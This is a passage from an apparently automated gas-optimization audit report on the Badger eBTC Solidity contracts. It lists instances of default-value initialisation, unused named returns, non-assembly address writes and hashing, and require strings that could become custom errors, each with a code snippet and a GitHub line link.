497    cdpManager.notifyStartGracePeriod(newTCR)
```
This call could be replaced with a low-level call because the contract `ICdpManager` has already been checked in <br>`Line: 457    cdpManager.syncGlobalAccounting()`<br>
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L497](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L497)


#

```
File: contracts/BorrowerOperations.sol

581    cdpManager.notifyEndGracePeriod(newTCR)
```
This call could be replaced with a low-level call because the contract `ICdpManager` has already been checked in <br>`Line: 559    cdpManager.syncAccounting(_cdpId)`<br>
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L581](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L581)


#

```
File: contracts/BorrowerOperations.sol

1103    ebtcToken.burn(feeRecipientAddress, amount)
```
This call could be replaced with a low-level call because the contract `IEBTCToken` has already been checked in <br>`Line: 1088    ebtcToken.mint(address(receiver), amount)`<br>
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1103](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1103)


#

```
File: contracts/CdpManager.sol

260    activePool.transferSystemCollSharesAndLiquidatorReward(
261                address(collSurplusPool),
262                _collSurplus,
263                _liquidatorRewardShares
264            )
```
This call could be replaced with a low-level call because the contract `IActivePool` has already been checked in <br>`Line: 254    activePool.decreaseSystemDebt(_EBTC)`<br>
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L260-L264](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L260-L264)


#

```
File: contracts/CdpManager.sol

481    activePool.allocateSystemCollSharesToFeeRecipient(totals.feeCollShares)
```
This call could be replaced with a low-level call because the contract `IActivePool` has already been checked in <br>`Line: 478    activePool.decreaseSystemDebt(totals.debtToRedeem)`<br>
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L481](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L481)


#

```
File: contracts/LeverageMacroBase.sol

427    IERC20(swapData.tokenForSwap).safeApprove(swapData.addressForApprove, 0)
```
This call could be replaced with a low-level call because the contract `SafeERC20` has already been checked in <br>`Line: 405    IERC20(swapData.tokenForSwap).safeApprove(
            swapData.addressForApprove,
            swapData.exactApproveAmount
        )`<br>
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L427](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L427)


#

```
File: contracts/LiquidationLibrary.sol

536    activePool.transferSystemCollSharesAndLiquidatorReward(
537                msg.sender,
538                totalCollSharesToSend,
539                totalLiquidatorRewardCollShares
540            )
```
This call could be replaced with a low-level call because the contract `IActivePool` has already been checked in <br>`Line: 533    activePool.decreaseSystemDebt(totalDebtToBurn)`<br>
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L536-L540](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L536-L540)


</details>

# 


## [G-44] Initialize Variables With Default Value
- Severity: Gas Optimization
- Confidence: High
- Total Gas Saved: 102

### Description
It costs more gas to initialize variables to their default values than to let the default be applied.

<details>

<summary>
There are 17 instances of this issue:

</summary>

###
#

```
File: contracts/Governor.sol

46    uint256 i = 0
```
 no need to initialized with default value
 
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L46](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L46)


#

```
File: contracts/Governor.sol

54    uint256 j = 0
```
 no need to initialized with default value
 
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L54](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L54)


#

```
File: contracts/Governor.sol

57    uint256 i = 0
```
 no need to initialized with default value
 
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L57](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L57)


#

```
File: contracts/Governor.sol

76    uint8 i = 0
```
 no need to initialized with default value
 
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L76](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L76)


#

```
File: contracts/Governor.sol

82    uint256 j = 0
```
 no need to initialized with default value
 
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L82](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L82)


#

```
File: contracts/Governor.sol

84    uint8 i = 0
```
 no need to initialized with default value
 
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L84](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L84)


#

```
File: contracts/Governor.sol

98    uint8 i = 0
```
 no need to initialized with default value
 
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L98](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L98)


#

```
File: contracts/Governor.sol

105    uint256 j = 0
```
 no need to initialized with default value
 
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L105](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L105)


#

```
File: contracts/Governor.sol

107    uint8 i = 0
```
 no need to initialized with default value
 
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L107](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L107)


#

```
File: contracts/Governor.sol

122    uint8 i = 0
```
 no need to initialized with default value
 
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L122](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L122)


#

```
File: contracts/Governor.sol

137    uint256 i = 0
```
 no need to initialized with default value
 
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L137](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L137)


#

```
File: contracts/SortedCdps.sol

182    uint _currentIndex = 0
```
 no need to initialized with default value
 
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L182](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L182)


#

```
File: contracts/SortedCdps.sol

245    uint _ownedCount = 0
```
 no need to initialized with default value
 
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L245](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L245)


#

```
File: contracts/SortedCdps.sol

246    uint i = 0
```
 no need to initialized with default value
 
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L246](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L246)


#

```
File: contracts/SortedCdps.sol

311    uint i = 0
```
 no need to initialized with default value
 
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L311](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L311)


#

```
File: contracts/SortedCdps.sol

432    uint256 i = 0
```
 no need to initialized with default value
 
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L432](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L432)


#

```
File: contracts/SortedCdps.sol

449    uint i = 0
```
 no need to initialized with default value
 
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L449](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L449)


</details>

# 


## [G-45] Unused Named Return Variables
- Severity: Gas Optimization
- Confidence: High

### Description
Named return variables allow for clear and explicit naming of values to be returned from a function. However, when these variables are unused, it can lead to confusion and make the code less maintainable.

<details>

<summary>
There are 4 instances of this issue:

</summary>

###
#

```
File: contracts/CdpManagerStorage.sol

719    function getPendingRedistributedDebt(
720            bytes32 _cdpId
721        ) public view returns (uint256 pendingEBTCDebtReward) 
```
there is not use of this variables:
@ **pendingEBTCDebtReward**

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L719-L724](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L719-L724)


#

```
File: contracts/CdpManager.sol

570    function getSystemDebt() public view returns (uint256 entireSystemDebt) 
```
there is not use of this variables:
@ **entireSystemDebt**

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L570-L572](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L570-L572)


#

```
File: contracts/Governor.sol

146    function getRoleName(uint8 role) external view returns (string memory roleName) 
```
there is not use of this variables:
@ **roleName**

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L146-L148](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L146-L148)


#

```
File: contracts/LiquidationLibrary.sol

544    function _calculatePartialLiquidationSurplusAndCap(
545            uint256 _ICR,
546            uint256 _price,
547            uint256 _totalDebtToBurn,
548            uint256 _totalColToSend
549        ) private view returns (uint256 toLiquidator, uint256 collSurplus, uint256 debtToRedistribute) 
```
there is not use of this variables:
@ **debtToRedistribute**

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L544-L568](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L544-L568)


</details>

# 


## [G-46] Use assembly to write address storage values
- Severity: Gas Optimization
- Confidence: High
- Total Gas Saved: 1848

### Description
Using assembly to write address storage values can potentially save gas costs. This detector flags instances where address storage values are written without using assembly.

<details>

<summary>
There are 24 instances of this issue:

</summary>

###
#

```
File: contracts/ActivePool.sol

57    feeRecipientAddress = _feeRecipientAddress
```
writes to an address storage value without using assembly.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L57](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L57)


#

```
File: contracts/ActivePool.sol

53    borrowerOperationsAddress = _borrowerOperationsAddress
```
writes to an address storage value without using assembly.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L53](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L53)


#

```
File: contracts/ActivePool.sol

54    cdpManagerAddress = _cdpManagerAddress
```
writes to an address storage value without using assembly.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L54](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L54)


#

```
File: contracts/ActivePool.sol

56    collSurplusPoolAddress = _collSurplusAddress
```
writes to an address storage value without using assembly.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L56](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L56)


#

```
File: contracts/ActivePool.sol

398    feeRecipientAddress = _feeRecipientAddress
```
writes to an address storage value without using assembly.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L398](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L398)


#

```
File: contracts/BorrowerOperations.sol

121    feeRecipientAddress = _feeRecipientAddress
```
writes to an address storage value without using assembly.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L121](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L121)


#

```
File: contracts/BorrowerOperations.sol

1148    feeRecipientAddress = _feeRecipientAddress
```
writes to an address storage value without using assembly.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1148](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1148)


#

```
File: contracts/CdpManagerStorage.sol

229    liquidationLibrary = _liquidationLibraryAddress
```
writes to an address storage value without using assembly.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L229](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L229)


#

```
File: contracts/CdpManagerStorage.sol

233    borrowerOperationsAddress = _borrowerOperationsAddress
```
writes to an address storage value without using assembly.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L233](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L233)


#

```
File: contracts/CollSurplusPool.sol

50    activePoolAddress = _activePoolAddress
```
writes to an address storage value without using assembly.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L50](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L50)


#

```
File: contracts/CollSurplusPool.sol

52    feeRecipientAddress = IActivePool(activePoolAddress).feeRecipientAddress()
```
writes to an address storage value without using assembly.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L52](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L52)


#

```
File: contracts/CollSurplusPool.sol

48    borrowerOperationsAddress = _borrowerOperationsAddress
```
writes to an address storage value without using assembly.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L48](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L48)


#

```
File: contracts/CollSurplusPool.sol

49    cdpManagerAddress = _cdpManagerAddress
```
writes to an address storage value without using assembly.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L49](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L49)


#

```
File: contracts/EBTCToken.sol

68    cdpManagerAddress = _cdpManagerAddress
```
writes to an address storage value without using assembly.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L68](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L68)


#

```
File: contracts/EBTCToken.sol

69    borrowerOperationsAddress = _borrowerOperationsAddress
```
writes to an address storage value without using assembly.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L69](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L69)


#

```
File: contracts/LeverageMacroFactory.sol

31    cdpManager = _cdpManager
```
writes to an address storage value without using assembly.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroFactory.sol#L31](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroFactory.sol#L31)


#

```
File: contracts/LeverageMacroFactory.sol

30    activePool = _activePool
```
writes to an address storage value without using assembly.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroFactory.sol#L30](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroFactory.sol#L30)


#

```
File: contracts/LeverageMacroFactory.sol

32    ebtcToken = _ebtc
```
writes to an address storage value without using assembly.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroFactory.sol#L32](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroFactory.sol#L32)


#

```
File: contracts/LeverageMacroFactory.sol

33    stETH = _coll
```
writes to an address storage value without using assembly.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroFactory.sol#L33](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroFactory.sol#L33)


#

```
File: contracts/LeverageMacroFactory.sol

34    sortedCdps = _sortedCdps
```
writes to an address storage value without using assembly.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroFactory.sol#L34](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroFactory.sol#L34)


#

```
File: contracts/LeverageMacroFactory.sol

29    borrowerOperations = _borrowerOperationsAddress
```
writes to an address storage value without using assembly.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroFactory.sol#L29](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroFactory.sol#L29)


#

```
File: contracts/LeverageMacroReference.sol

36    theOwner = _owner
```
writes to an address storage value without using assembly.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroReference.sol#L36](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroReference.sol#L36)


#

```
File: contracts/SimplifiedDiamondLike.sol

45    owner = _owner
```
writes to an address storage value without using assembly.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SimplifiedDiamondLike.sol#L45](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SimplifiedDiamondLike.sol#L45)


#

```
File: contracts/SortedCdps.sol

96    borrowerOperationsAddress = _borrowerOperationsAddress
```
writes to an address storage value without using assembly.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L96](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L96)


</details>

# 


## [G-47] Use Assembly for Hash Calculation
- Severity: Gas Optimization
- Confidence: Medium
- Total Gas Saved: 960

### Description
Detects places in the code where hash calculation could be done using inline assembly to optimize gas usage.

<details>

<summary>
There are 12 instances of this issue:

</summary>

###
#

```
File: contracts/BorrowerOperations.sol

129    bytes32 hashedVersion = keccak256(bytes(_VERSION))
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L129](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L129)


#

```
File: contracts/BorrowerOperations.sol

682    return keccak256(abi.encode(typeHash, name, version, _chainID(), address(this)))
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L682](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L682)


#

```
File: contracts/BorrowerOperations.sol

128    bytes32 hashedName = keccak256(bytes(NAME))
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L128](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L128)


#

```
File: contracts/BorrowerOperations.sol

717    bytes32 digest = keccak256(
718                abi.encodePacked(
719                    "\x19\x01",
720                    domainSeparator(),
721                    keccak256(
722                        abi.encode(
723                            _PERMIT_POSITION_MANAGER_TYPEHASH,
724                            _borrower,
725                            _positionManager,
726                            _approval,
727                            _nonces[_borrower]++,
728                            _deadline
729                        )
730                    )
731                )
732            )
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L717-L732](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L717-L732)


#

```
File: contracts/BorrowerOperations.sol

32    bytes32 private constant _PERMIT_POSITION_MANAGER_TYPEHASH =
33            keccak256(
34                "PermitPositionManagerApproval(address borrower,address positionManager,uint8 status,uint256 nonce,uint256 deadline)"
35            )
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L32-L35](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L32-L35)


#

```
File: contracts/EBTCToken.sol

71    bytes32 hashedName = keccak256(bytes(_NAME))
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L71](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L71)


#

```
File: contracts/EBTCToken.sol

72    bytes32 hashedVersion = keccak256(bytes(_VERSION))
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L72](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L72)


#

```
File: contracts/EBTCToken.sol

240    return keccak256(abi.encode(typeHash, name, version, _chainID(), address(this)))
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L240](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L240)


#

```
File: contracts/EBTCToken.sol

209    bytes32 digest = keccak256(
210                abi.encodePacked(
211                    "\x19\x01",
212                    domainSeparator(),
213                    keccak256(
214                        abi.encode(_PERMIT_TYPEHASH, owner, spender, amount, _nonces[owner]++, deadline)
215                    )
216                )
217            )
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L209-L217](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L209-L217)


#

```
File: contracts/HintHelpers.sol

182    latestRandomSeed = uint256(keccak256(abi.encodePacked(latestRandomSeed)))
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/HintHelpers.sol#L182](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/HintHelpers.sol#L182)


#

```
File: contracts/LeverageMacroBase.sol

37    bytes32 constant FLASH_LOAN_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan")
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L37](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L37)


#

```
File: contracts/SimplifiedDiamondLike.sol

39    bytes32 constant DIAMOND_STORAGE_POSITION = keccak256("diamond.standard.diamond.storage")
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SimplifiedDiamondLike.sol#L39](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SimplifiedDiamondLike.sol#L39)


</details>

# 


## [G-48] Usage of Custom Errors for Gas Efficiency
- Severity: Gas Optimization
- Confidence: High
- Total Gas Saved: 41952

### Description
This detector flags functions that use revert()/require() strings, which are less gas efficient than custom errors. Custom errors, available from Solidity version 0.8.4, save approximately 50 gas each time they're used by avoiding the need to allocate and store the revert string.

<details>

<summary>
There are 152 instances of this issue:

</summary>

###
#

```
File: contracts/ActivePool.sol

104    require(cachedSystemCollShares >= _shares, "!ActivePoolBal")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L104](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L104)


#

```
File: contracts/ActivePool.sol

137    require(cachedSystemCollShares >= _shares, "ActivePool: Insufficient collateral shares")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L137](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L137)


#

```
File: contracts/ActivePool.sol

162    require(cachedSystemCollShares >= _shares, "ActivePool: Insufficient collateral shares")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L162](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L162)


#

```
File: contracts/ActivePool.sol

220    require(
221                msg.sender == borrowerOperationsAddress,
222                "ActivePool: Caller is not BorrowerOperations"
223            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L220-L223](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L220-L223)


#

```
File: contracts/ActivePool.sol

228    require(
229                msg.sender == borrowerOperationsAddress || msg.sender == cdpManagerAddress,
230                "ActivePool: Caller is neither BorrowerOperations nor CdpManager"
231            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L228-L231](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L228-L231)


#

```
File: contracts/ActivePool.sol

236    require(msg.sender == cdpManagerAddress, "ActivePool: Caller is not CdpManager")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L236](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L236)


#

```
File: contracts/ActivePool.sol

267    require(amount > 0, "ActivePool: 0 Amount")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L267](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L267)


#

```
File: contracts/ActivePool.sol

269    require(amount <= maxFlashLoan(token), "ActivePool: Too much")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L269](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L269)


#

```
File: contracts/ActivePool.sol

277    require(
278                receiver.onFlashLoan(msg.sender, token, amount, fee, data) == FLASH_SUCCESS_VALUE,
279                "ActivePool: IERC3156: Callback failed"
280            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L277-L280](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L277-L280)


#

```
File: contracts/ActivePool.sol

294    require(
295                collateral.balanceOf(address(this)) >= collateral.getPooledEthByShares(systemCollShares),
296                "ActivePool: Must repay Balance"
297            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L294-L297](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L294-L297)


#

```
File: contracts/ActivePool.sol

298    require(
299                collateral.sharesOf(address(this)) >= systemCollShares,
300                "ActivePool: Must repay Share"
301            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L298-L301](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L298-L301)


#

```
File: contracts/ActivePool.sol

302    require(
303                collateral.getPooledEthByShares(DECIMAL_PRECISION) == oldRate,
304                "ActivePool: Should keep same collateral share rate"
305            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L302-L305](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L302-L305)


#

```
File: contracts/ActivePool.sol

318    require(token == address(collateral), "ActivePool: collateral Only")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L318](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L318)


#

```
File: contracts/ActivePool.sol

319    require(!flashLoansPaused, "ActivePool: Flash Loans Paused")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L319](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L319)


#

```
File: contracts/ActivePool.sol

350    require(
351                cachedFeeRecipientCollShares >= _shares,
352                "ActivePool: Insufficient fee recipient coll"
353            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L350-L353](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L350-L353)


#

```
File: contracts/ActivePool.sol

374    require(token != address(collateral), "ActivePool: Cannot Sweep Collateral")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L374](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L374)


#

```
File: contracts/ActivePool.sol

377    require(amount <= balance, "ActivePool: Attempt to sweep more than balance")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L377](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L377)


#

```
File: contracts/ActivePool.sol

393    require(
394                _feeRecipientAddress != address(0),
395                "ActivePool: Cannot set fee recipient to zero address"
396            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L393-L396](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L393-L396)


#

```
